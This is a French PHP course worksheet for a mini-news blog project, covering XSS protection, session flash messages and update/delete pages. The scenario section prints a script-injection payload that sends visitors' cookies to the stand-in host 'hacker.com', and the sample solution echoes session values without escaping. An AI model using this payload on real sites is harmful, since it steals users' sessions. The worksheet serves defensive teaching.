# Atelier 8 : Sécurité XSS, Messages Flash et Finalisation

## 1. Fiche d'identité

* **Thème :** Protection contre les injections de scripts et expérience utilisateur (UX).
* **Durée :** 3 heures.
* **Compétences visées :** * Prévenir les failles **XSS** (Cross-Site Scripting).
* Implémenter des **Messages Flash** (notifications temporaires via session).
* Finaliser le CRUD (Update/Delete) avec une ergonomie propre.


## 2. Préparation (10 min)

1. **Dossier :** Finalisez votre projet dans `~/Documents/mini-news`.
2. **Fichiers à créer :** `modifier.php` et `supprimer.php`.
3. **Référence :** [Pierre Giraud - Sécurité PHP & Failles](https://www.google.com/search?q=https://www.pierre-giraud.com/php-mysql-apprendre-coder-cours/securite-faille-xss-csrf/) et [Utilisation avancée des sessions](https://www.google.com/search?q=https://www.pierre-giraud.com/php-mysql-apprendre-coder-cours/session-cookie/).

## 3. Quiz : Le nettoyage des sorties (10 min)

1. L'injection SQL visait la base de données. Quelle cible visent les failles XSS ?
2. En C, on nettoie les buffers pour éviter les crashs. En PHP, pourquoi ne faut-il jamais faire `echo $donnee_utilisateur;` directement ?
3. Quelle fonction PHP transforme les balises `<script>` en texte inoffensif `&lt;script&gt;` ?
4. Un "Message Flash" doit-il persister après avoir été affiché une fois ?

## 4. Mise en situation

Votre blog est fonctionnel, mais il est vulnérable. Si un utilisateur malveillant poste un commentaire ou une news contenant `<script>location.href='http://hacker.com?cookie='+document.cookie</script>`, il peut voler les sessions de vos administrateurs. C'est la faille **XSS**. Votre mission : sécuriser l'affichage et ajouter des retours visuels pour l'utilisateur.

## 5. Exploration guidée (30 min)

### La règle d'or : "Filter Input, Escape Output"

* **Input (Entrée) :** On a déjà utilisé `strip_tags()` ou les requêtes préparées.
* **Output (Sortie) :** À chaque fois que vous affichez une donnée venant de la BDD, utilisez `htmlspecialchars()`.

### Le concept de Message Flash

C'est une information stockée en session que l'on affiche, puis que l'on supprime immédiatement (consommation unique).

```php
// Sur la page de traitement
$_SESSION['message'] = "Article ajouté !";

// Sur la page d'accueil
if(isset($_SESSION['message'])) {
    echo "<div class='alert'>" . $_SESSION['message'] . "</div>";
    unset($_SESSION['message']); // On vide la mémoire
}

```

## 6. Production principale (1h15)

**Objectif : Finaliser le cycle de vie des news (Update & Delete).**

1. **Suppression sécurisée :** Créez `supprimer.php`. Il doit vérifier que l'utilisateur est admin, récupérer l'ID en GET, et exécuter un `DELETE`. Avant de rediriger, créez un message flash : "News supprimée".
2. **Modification (Update) :** Créez `modifier.php`.
* Il doit récupérer les données actuelles de l'article pour pré-remplir un formulaire.
* À la soumission, il exécute un `UPDATE` avec une requête préparée.


3. **Protection XSS :** Repassez sur `index.php` et `article.php`. Enrobez tous les `echo` de variables par `htmlspecialchars()`.

## 7. Exercices progressifs (45 min)

### Niveau 1 : Formatage de date "humain"

En C, formater le temps est complexe (`strftime`). En PHP, utilisez la classe `DateTime` pour afficher vos dates au format : "Publié le 12 Février 2026 à 14h".

### Niveau 2 : Le sélecteur d'alerte

Améliorez vos messages flash. Stockez un tableau : `$_SESSION['flash'] = ['type' => 'success', 'texte' => 'Action réussie'];`. Utilisez le 'type' pour changer la couleur du message (vert pour succès, rouge pour erreur).

### Niveau 3 : Confirmation de suppression

Utilisez un petit script JavaScript (ou un simple attribut HTML `onclick="return confirm('Etes-vous sûr ?')"` sur vos boutons supprimer) pour éviter les erreurs de manipulation.

## 8. Difficulté encadrée

**L'oubli du `where` en SQL :**
C'est l'erreur fatale (l'équivalent d'un `free()` sur un mauvais pointeur en C). Si vous oubliez `WHERE id = ?` dans un `UPDATE` ou un `DELETE`, vous allez modifier ou supprimer **toute** votre base de données.
**Conseil :** Toujours tester vos requêtes SQL dans l'onglet SQL de phpMyAdmin avant de les coder en PHP.

## 9. Correction détaillée (Le Message Flash)

```php
// Dans functions.php (ou en haut de index.php)
function display_flash() {
    if (isset($_SESSION['flash'])) {
        $type = $_SESSION['flash']['type'];
        $msg = $_SESSION['flash']['text'];
        echo "<div class='alert alert-$type'>$msg</div>";
        unset($_SESSION['flash']);
    }
}

// Dans supprimer.php
$_SESSION['flash'] = ['type' => 'danger', 'text' => 'Article supprimé.'];
header('Location: index.php');

```

## 10. Challenge autonome (20 min)

**"Le Dashboard Récapitulatif"**

1. Créez une page `admin.php` qui liste tous les articles sous forme de tableau HTML (Table).
2. Ajoutez deux colonnes "Actions" avec des icônes ou des liens pour "Modifier" et "Supprimer".
3. Affichez en haut de cette page une statistique : "Moyenne de caractères par article".

## 11. Bilan de compétences

À la fin de cet atelier, l'étudiant doit savoir :

*  Neutraliser les attaques XSS via l'échappement des caractères HTML.
*  Gérer un CRUD complet (Create, Read, Update, Delete) de manière sécurisée.
*  Communiquer avec l'utilisateur via des notifications temporaires (Sessions).
*  Livrer un code PHP structuré, modulaire et protégé.

